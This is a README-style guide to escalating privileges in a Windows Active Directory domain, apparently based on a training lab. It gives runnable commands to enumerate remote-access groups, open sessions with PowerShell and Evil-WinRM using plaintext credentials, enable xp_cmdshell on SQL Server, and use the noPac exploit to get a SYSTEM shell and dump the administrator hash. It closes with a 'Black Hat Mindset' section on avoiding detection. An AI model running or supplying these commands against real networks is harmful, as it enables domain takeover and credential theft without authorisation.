# Basic Methodology - Privileged Access README

This README explores techniques for gaining privileged access on Windows systems by enumerating groups, establishing remote sessions, interacting with SQL servers, and exploiting vulnerabilities like noPac/Sam_The_Admin.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating Remote Desktop Users](#enumerating-remote-desktop-users)
- [Enumerating Remote Management Users](#enumerating-remote-management-users)
- [Creating PowerShell Credentials](#creating-powershell-credentials)
- [Establishing a PowerShell Session](#establishing-a-powershell-session)
- [Connecting via Evil-WinRM](#connecting-via-evil-winrm)
- [Enumerating SQL Instances with PowerUpSQL](#enumerating-sql-instances-with-powerupsql)
- [Querying SQL Server Version with PowerUpSQL](#querying-sql-server-version-with-powerupsql)
- [Using mssqlclient.py (Impacket)](#using-mssqlclientpy-impacket)
- [Enabling and Using xp_cmdshell](#enabling-and-using-xp_cmdshell)
- [Exploiting noPac/Sam_The_Admin Vulnerability](#exploiting-nopac-sam_the_admin-vulnerability)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Privileged access techniques aim to escalate privileges on Windows systems, often targeting remote access groups, SQL servers, and Active Directory vulnerabilities. This guide covers enumerating group memberships with PowerView, establishing sessions with PowerShell and Evil-WinRM, interacting with SQL servers using PowerUpSQL and Impacket, and exploiting the noPac/Sam_The_Admin vulnerability to gain SYSTEM or domain admin access.

## Setup and Prerequisites

- **Environment**: Windows host for PowerShell commands; Linux host for evil-winrm, mssqlclient.py, and noPac exploitation.
- **Tools**: Install evil-winrm (e.g., `gem install evil-winrm`), Python 3, Impacket (`pip install impacket`), git, and download PowerView, PowerUpSQL (PowerUpSQL.ps1), and noPac (via git clone).
- **Credentials**: Have usernames and passwords ready (e.g., forend:Klmcargo2, damundsen:SQL1234!).
- **IP Address**: Identify target IPs (e.g., 10.129.201.234, 172.16.5.150, 172.16.5.5).
- **Permissions**: Administrative access may be required for some commands (e.g., PowerShell sessions, SQL server interaction).

## Enumerating Remote Desktop Users

List members of the Remote Desktop Users group.

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

Example Output:
```
ComputerName: ACADEMY-EA-MS01
GroupName: Remote Desktop Users
MemberName: INLANEFREIGHT\forend
```

## Enumerating Remote Management Users

List members of the Remote Management Users group.

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

Example Output:
```
ComputerName: ACADEMY-EA-MS01
GroupName: Remote Management Users
MemberName: INLANEFREIGHT\damundsen
```

## Creating PowerShell Credentials

Set up credentials for remote PowerShell sessions.

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
```

## Establishing a PowerShell Session

Connect to a target using PowerShell remoting.

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```

Outcome: Opens a remote PowerShell session on the target.

## Connecting via Evil-WinRM

Establish a PowerShell session using WinRM.

```bash
evil-winrm -i 10.129.201.234 -u forend
```

Example:
```
Password: Klmcargo2
Output: Opens a PowerShell session on the target.
```

## Enumerating SQL Instances with PowerUpSQL

Discover SQL Server instances in the domain.

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

Example Output:
```
Instance: 172.16.5.150,1433
ComputerName: ACADEMY-EA-SQL01
```

## Querying SQL Server Version with PowerUpSQL

Query the SQL Server version.

```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

Example Output:
```
Microsoft SQL Server 2019 (RTM)
```

## Using mssqlclient.py (Impacket)

Interact with an MSSQL server.

```bash
mssqlclient.py
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

```sql
SQL> help
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

Example Output:
```
whoami: INLANEFREIGHT\damundsen
/priv: SeImpersonatePrivilege
```

## Exploiting noPac/Sam_The_Admin Vulnerability

Exploit the noPac/Sam_The_Admin vulnerability for privilege escalation.

```bash
sudo git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

Example Output:
```
SYSTEM shell or DCSync output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## Black Hat Mindset

- **Enumerate Privileges**: Use PowerView to identify users with remote access for targeted attacks.
- **Escalate via SQL**: Leverage SQL Server misconfigurations (e.g., xp_cmdshell) to execute OS commands.
- **Exploit Vulnerabilities**: Use noPac to gain SYSTEM or domain admin access through Active Directory flaws.
- **Stay Silent**: Blend in with legitimate sessions (e.g., WinRM, PowerShell) to avoid detection.

## Resources

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [PowerUpSQL GitHub](https://github.com/NetSPI/PowerUpSQL)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [noPac GitHub](https://github.com/Ridter/noPac)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)

